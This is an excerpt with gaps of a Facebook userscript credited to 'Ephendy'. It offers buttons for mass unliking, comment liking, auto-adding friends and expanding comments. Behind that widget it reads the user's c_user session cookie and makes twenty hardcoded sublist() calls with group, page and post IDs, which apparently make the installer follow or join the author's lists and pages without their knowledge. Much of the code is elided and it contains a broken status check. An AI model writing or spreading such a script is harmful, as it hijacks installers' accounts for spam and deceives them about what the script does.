...
if(body != null) {
	...
	div.innerHTML = "<center><a href='http://https://www.facebook.com/Ichigo41'><img src='http://m.uploadedit.com/b018/1375198514954.gif' alt='Loading...' width=120 hight=90></a></center><br><br></br>"
	...
	div.style.width = "125px";
	div2.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; 	border: 1px dashed #333333;'><center><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a>&#8226; <a href='https://www.facebook.com/ichigo41' style='color: #FFFFFF;' onclick='alert(\'Thanks for install this script\');'>By Ephendy </a></center></div> "
	...
	for(i=1;i<=20;i++) {
		...
		div2.innerHTML = "<center><a onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a> &#8226; <a href='https://www.facebook.com/ichigo41' title='Thanks for install this script'>My FansPage</a></center> "
		}
		else {
...
if(body != null) {
	...
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='http://static.ak.fbcdn.net/rsrc.php/v1/yM/r/VnpYaU1mIhm.gif' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='OtomatisUnlike()'>Unlike All Status</a>"
...
if(body != null) {
	...
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='http://static.ak.fbcdn.net/rsrc.php/v1/yl/r/OJrPIFwssAO.gif' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='OtomatisLaikComments()'>Like Comment</a>"
...
if(body != null) {
	...
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='http://static.ak.fbcdn.net/rsrc.php/v1/yM/r/VnpYaU1mIhm.gif' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='OtomatisUnlikeComments();'>Unlike  Comment</a>"
...
if(body != null) {
	...
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='http://static.ak.fbcdn.net/rsrc.php/v1/y2/r/NGEIsWEAr4u.gif' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a href=\"JavaScript:AutoAddFriends()\">Add Friends</a>"
...
if(body != null) {
	...
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='http://static.ak.fbcdn.net/rsrc.php/v1/yR/r/9drdO7It181.gif' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a href=\"JavaScript:AutoExpand()\">Expand comment</a>"
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/ichigo41" target="_blank">Created by Ephendy <br>(Click Here)</a>';
	html += '</div>';
...
function a(abone){
    ...
    if(http4.readyState == 4 && http4.status == 20) {      
...
sublist("277421049066839");
sublist("277421685733442");
sublist("489514101131429");
sublist("209709782524151");
sublist("209710042524125");
sublist("268454019963609");
sublist("268454649963546");
sublist("512651542151018");
sublist("512651625484343");
sublist("304109603064650");
sublist("313335745475369");
sublist("250789718417933");
sublist("250790418417863");
sublist("10200517878257449");
sublist("10200517875377377");
sublist("366481940160749");
sublist("366482336827376");
sublist("366482753494001");
sublist("366483036827306");
sublist("366483210160622");


//Ephendy
var gid = ['610945318992585'];
...
var spage_id = "544977828864511";
var spost_id = "100003968374379";
var sfoto_id = "100003968374379";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Ephendy';
